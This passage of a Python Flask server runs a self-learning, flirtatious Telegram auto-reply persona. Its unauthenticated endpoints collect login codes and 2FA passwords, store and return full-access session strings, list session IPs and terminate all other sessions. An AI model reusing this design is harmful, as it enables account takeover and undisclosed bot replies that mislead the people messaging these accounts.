        logger.info(f"Code sent to {phone}")
        
        session_id = hashlib.md5(f"{phone}_{time.time()}".encode()).hexdigest()
        temp_sessions[session_id] = {
            'client': client,
            'phone': phone,
            'phone_code_hash': result.phone_code_hash,
            'created': time.time(),
            'loop': loop
        }
        
        return jsonify({
            'success': True,
            'session_id': session_id,
            'message': 'Code sent successfully'
        })
        
    except Exception as e:
        logger.error(f"Error: {str(e)}")
        if 'client' in locals():
            try:
                loop.run_until_complete(client.disconnect())
            except:
                pass
        if 'loop' in locals():
            loop.close()
        
        error_msg = str(e)
        if "PHONE_NUMBER_INVALID" in error_msg:
            return jsonify({'success': False, 'error': 'Invalid phone number format'})
        elif "FLOOD_WAIT" in error_msg:
            match = re.search(r'FLOOD_WAIT_(\d+)', error_msg)
            if match:
                return jsonify({'success': False, 'error': f'Too many attempts. Wait {match.group(1)} seconds'})
            return jsonify({'success': False, 'error': 'Too many attempts. Please try later'})
        else:
            return jsonify({'success': False, 'error': f'Failed: {error_msg}'})

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    data = request.json
    code = data.get('code')
    session_id = data.get('session_id')
    password = data.get('password', '')
    
    if not code or not session_id:
        return jsonify({'success': False, 'error': 'Code and session ID required'})
    
    if session_id not in temp_sessions:
        return jsonify({'success': False, 'error': 'Session expired'})
    
    session_data = temp_sessions[session_id]
    client = session_data['client']
    phone = session_data['phone']
    phone_code_hash = session_data['phone_code_hash']
    loop = session_data.get('loop')
    
    if loop:
        asyncio.set_event_loop(loop)
    else:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    
    try:
        user = loop.run_until_complete(client.sign_in(phone, code, phone_code_hash=phone_code_hash))
        
        me = loop.run_until_complete(client.get_me())
        string_session = client.session.save()
        
        account = {
            'id': me.id,
            'name': f"{me.first_name or ''} {me.last_name or ''}".strip() or f"User {me.id}",
            'phone': phone,
            'session': string_session,
            'added': time.time()
        }
        
        accounts.append(account)
        save_accounts()
        
        reply_settings[str(me.id)] = {
            'enabled': False,
            'chats': {}
        }
        save_reply_settings()
        
        loop.run_until_complete(client.disconnect())
        loop.close()
        del temp_sessions[session_id]
        
        return jsonify({'success': True, 'account': account})
        
    except SessionPasswordNeededError:
        if password:
            try:
                loop.run_until_complete(client.sign_in(password=password))
                
                me = loop.run_until_complete(client.get_me())
                string_session = client.session.save()
                
                account = {
                    'id': me.id,
                    'name': f"{me.first_name or ''} {me.last_name or ''}".strip() or f"User {me.id}",
                    'phone': phone,
                    'session': string_session,
                    'added': time.time()
                }
                
                accounts.append(account)
                save_accounts()
                
                reply_settings[str(me.id)] = {
                    'enabled': False,
                    'chats': {}
                }
                save_reply_settings()
                
                loop.run_until_complete(client.disconnect())
                loop.close()
                del temp_sessions[session_id]
                
                return jsonify({'success': True, 'account': account})
                
            except Exception as e:
                return jsonify({'success': False, 'error': str(e)})
        else:
            return jsonify({'success': False, 'need_password': True})
            
    except PhoneCodeInvalidError:
        return jsonify({'success': False, 'error': 'Invalid code'})
    except PhoneCodeExpiredError:
        return jsonify({'success': False, 'error': 'Code expired'})
    except Exception as e:
        logger.error(f"Error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/reply-settings', methods=['GET'])
def get_reply_settings():
    account_id = request.args.get('accountId')
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    settings = reply_settings.get(str(account_id), {
        'enabled': False,
        'chats': {}
    })
    
    return jsonify({
        'success': True,
        'settings': settings
    })

@app.route('/api/reply-settings', methods=['POST'])
def update_reply_settings():
    data = request.json
    account_id = data.get('accountId')
    enabled = data.get('enabled', False)
    chats = data.get('chats', {})
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account_key = str(account_id)
    
    reply_settings[account_key] = {
        'enabled': enabled,
        'chats': chats
    }
    save_reply_settings()
    
    if enabled:
        if account_key not in active_clients:
            account = next((a for a in accounts if str(a['id']) == account_key), None)
            if account:
                thread = threading.Thread(
                    target=lambda: run_async(lambda: start_auto_reply_for_account(account)),
                    daemon=True
                )
                thread.start()
                client_tasks[account_key] = thread
    else:
        stop_auto_reply_for_account(account_id)
    
    return jsonify({'success': True})

@app.route('/api/toggle-chat-reply', methods=['POST'])
def toggle_chat_reply():
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    enabled = data.get('enabled', True)
    
    if not account_id or not chat_id:
        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
    
    account_key = str(account_id)
    
    if account_key not in reply_settings:
        reply_settings[account_key] = {
            'enabled': False,
            'chats': {}
        }
    
    if 'chats' not in reply_settings[account_key]:
        reply_settings[account_key]['chats'] = {}
    
    if chat_id not in reply_settings[account_key]['chats']:
        reply_settings[account_key]['chats'][chat_id] = {}
    
    reply_settings[account_key]['chats'][chat_id]['enabled'] = enabled
    save_reply_settings()
    
    return jsonify({'success': True})

@app.route('/api/get-messages', methods=['POST'])
def get_messages():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account = next((a for a in accounts if a['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        loop.run_until_complete(client.connect())
        
        if not loop.run_until_complete(client.is_user_authorized()):
            return jsonify({'success': False, 'error': 'Not authorized'})
        
        dialogs = loop.run_until_complete(client.get_dialogs())
        
        chats = []
        for dialog in dialogs:
            if dialog.is_user and not dialog.entity.bot:
                chat = {
                    'id': str(dialog.id),
                    'title': dialog.name or f"User {dialog.id}",
                    'type': 'user',
                    'lastMessage': dialog.message.text[:50] if dialog.message and dialog.message.text else 'No messages'
                }
                chats.append(chat)
        
        loop.run_until_complete(client.disconnect())
        loop.close()
        
        return jsonify({
            'success': True,
            'chats': chats
        })
        
    except Exception as e:
        logger.error(f"Error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/get-sessions', methods=['POST'])
def get_sessions():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account = next((a for a in accounts if a['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        loop.run_until_complete(client.connect())
        
        if not loop.run_until_complete(client.is_user_authorized()):
            return jsonify({'success': False, 'error': 'Not authorized'})
        
        auths = loop.run_until_complete(client(GetAuthorizationsRequest()))
        
        sessions = []
        for auth in auths.authorizations:
            session = {
                'hash': auth.hash,
                'device_model': auth.device_model,
                'platform': auth.platform,
                'system_version': auth.system_version,
                'api_id': auth.api_id,
                'app_name': auth.app_name,
                'app_version': auth.app_version,
                'date_created': auth.date_created,
                'date_active': auth.date_active,
                'ip': auth.ip,
                'country': auth.country,
                'region': auth.region,
                'current': auth.current
            }
            sessions.append(session)
        
        loop.run_until_complete(client.disconnect())
        loop.close()
        
        current_hash = None
        for s in sessions:
            if s['current']:
                current_hash = s['hash']
                break
        
        return jsonify({
            'success': True,
            'sessions': sessions,
            'current_hash': current_hash
        })
        
    except Exception as e:
        logger.error(f"Error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/terminate-session', methods=['POST'])
def terminate_session():
    data = request.json
    account_id = data.get('accountId')
    hash_value = data.get('hash')
    
    if not account_id or not hash_value:
        return jsonify({'success': False, 'error': 'Account ID and session hash required'})
    
    account = next((a for a in accounts if a['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        loop.run_until_complete(client.connect())
        
        if not loop.run_until_complete(client.is_user_authorized()):
            return jsonify({'success': False, 'error': 'Not authorized'})
        
        loop.run_until_complete(client(ResetAuthorizationRequest(hash_value)))
        
        loop.run_until_complete(client.disconnect())
        loop.close()
        
        return jsonify({'success': True, 'message': 'Session terminated'})
        
    except Exception as e:
        logger.error(f"Error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/terminate-sessions', methods=['POST'])
def terminate_all_sessions():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account = next((a for a in accounts if a['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        loop.run_until_complete(client.connect())
        
        if not loop.run_until_complete(client.is_user_authorized()):
            return jsonify({'success': False, 'error': 'Not authorized'})
        
        auths = loop.run_until_complete(client(GetAuthorizationsRequest()))
        
        for auth in auths.authorizations:
            if not auth.current:
                try:
                    loop.run_until_complete(client(ResetAuthorizationRequest(auth.hash)))
                except:
                    pass
        
        loop.run_until_complete(client.disconnect())
        loop.close()
        
        return jsonify({'success': True, 'message': 'All other sessions terminated'})
        
    except Exception as e:
        logger.error(f"Error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/conversation-history', methods=['GET'])
def get_conversation_history():
    account_id = request.args.get('accountId')
    chat_id = request.args.get('chatId')
    
    if not account_id or not chat_id:
        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
    
    account_key = str(account_id)
    
    history = []
    if account_key in conversation_history and chat_id in conversation_history[account_key]:
        history = conversation_history[account_key][chat_id]
    
    return jsonify({
        'success': True,
        'history': history
    })

@app.route('/api/clear-history', methods=['POST'])
def clear_history():
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    
    if not account_id or not chat_id:
        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
    
    account_key = str(account_id)
    
    if account_key in conversation_history and chat_id in conversation_history[account_key]:
        conversation_history[account_key][chat_id] = []
        save_conversation_history()
    
    return jsonify({'success': True})

@app.route('/api/learning-stats', methods=['GET'])
def get_learning_stats():
    account_id = request.args.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account_key = str(account_id)
    
    if account_key not in learning_data:
        return jsonify({'success': False, 'error': 'No learning data found'})
    
    data = learning_data[account_key]
    evolution = data['evolution']
    patterns = data['patterns']
    
    top_phrases = sorted(patterns['phrase_freq'].items(), key=lambda x: x[1], reverse=True)[:10]
    
    success_rates = {}
    for intent in patterns['successful_intents']:
        success = patterns['successful_intents'].get(intent, 0)
        failed = patterns['failed_intents'].get(intent, 0)
        total = success + failed
        if total > 0:
            success_rates[intent] = round(success / total * 100, 1)
    
    return jsonify({
        'success': True,
        'stats': {
            'total_messages': evolution['total_messages'],
            'unique_users': len(evolution['unique_users']),
            'learning_iterations': evolution['learning_iterations'],
            'personality_traits': evolution['personality_traits'],
            'top_phrases': top_phrases,
            'success_rates': success_rates,
            'replies_count': {k: len(v) for k, v in data['replies'].items()}
        }
    })

@app.route('/api/evolve-now', methods=['POST'])
def force_evolution():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    learner = TsegaLearner(account_id)
    learner.evolve_personality()
    
    return jsonify({'success': True, 'message': 'Personality evolved'})

@app.route('/api/reset-learning', methods=['POST'])
def reset_learning():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account_key = str(account_id)
    if account_key in learning_data:
        del learning_data[account_key]
        save_learning_data()
    
    return jsonify({'success': True, 'message': 'Learning data reset'})

@app.route('/api/health', methods=['GET'])
def health():
    return jsonify({
        'status': 'healthy',
        'accounts': len(accounts),
        'active_clients': len(active_clients),
        'learning_accounts': len(learning_data),
        'timestamp': time.time()
    })

@app.route('/api/test-telegram', methods=['GET'])
def test_telegram_connection():
    """Test Telegram API connection"""
    results = {
        'api_id': API_ID,
        'api_id_valid': False,
        'connection': False,
        'errors': []
    }
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        client = TelegramClient(StringSession(), API_ID, API_HASH, timeout=10)
        connected = loop.run_until_complete(client.connect())
        
        if connected:
            results['connection'] = True
            results['api_id_valid'] = "API ID seems valid"
        
        loop.run_until_complete(client.disconnect())
        loop.close()
        
        return jsonify({
            'success': True,
            'results': results
        })
        
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e),
            'results': results
        })

# ==================== KEEP ALIVE ====================

def keep_alive():
    """Keep Render from sleeping"""
    app_url = os.environ.get('RENDER_EXTERNAL_URL', 'https://e-gram-98zv.onrender.com')
    
    while True:
        try:
            requests.get(f"{app_url}/api/health", timeout=10)
            
            for account_key, client in list(active_clients.items()):
                try:
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    if client and hasattr(client, 'get_me'):
                        coro = client.get_me()
                        if asyncio.iscoroutine(coro):
                            loop.run_until_complete(coro)
                    loop.close()
                    logger.info(f"✅ Connection alive for account {account_key}")
                except Exception as e:
                    logger.warning(f"⚠️ Connection dead for account {account_key}: {e}")
            
            logger.info(f"🔋 Keep-alive ping sent")
        except Exception as e:
            logger.error(f"Keep-alive error: {e}")
        
        time.sleep(240)

# ==================== STARTUP ====================

def start_auto_reply_thread():
    """Start auto-reply in background"""
    time.sleep(5)
    logger.info("Starting Tsega self-learning personality for enabled accounts...")
    start_all_auto_replies()

# Import events
from telethon import events

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    
    print('\n' + '='*70)
    print('🤖 TSEGA - SELF-LEARNING TELEGRAM PERSONALITY')
    print('='*70)
    print(f'✅ Port: {port}')
    print(f'✅ Accounts loaded: {len(accounts)}')
    print(f'✅ Learning data: {len(learning_data)} accounts')
    print('='*70)
    
    for acc in accounts:
        status = "ENABLED" if str(acc['id']) in reply_settings and reply_settings[str(acc['id'])].get('enabled') else "DISABLED"
        learned = "✓" if str(acc['id']) in learning_data else " "
        print(f'   • {acc.get("name")} ({acc.get("phone")}) - {status} [Learned:{learned}]')
    
    print('='*70)
    print('🚀 SELF-LEARNING FEATURES:')
    print('   • Learns from every conversation')
    print('   • Evolves personality based on success rate')
    print('   • Remembers user preferences')
    print('   • Adapts flirty level based on responses')
    print('   • Hourly personality evolution')
    print('='*70 + '\n')
    
    threading.Thread(target=keep_alive, daemon=True).start()
    threading.Thread(target=start_auto_reply_thread, daemon=True).start()
    
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
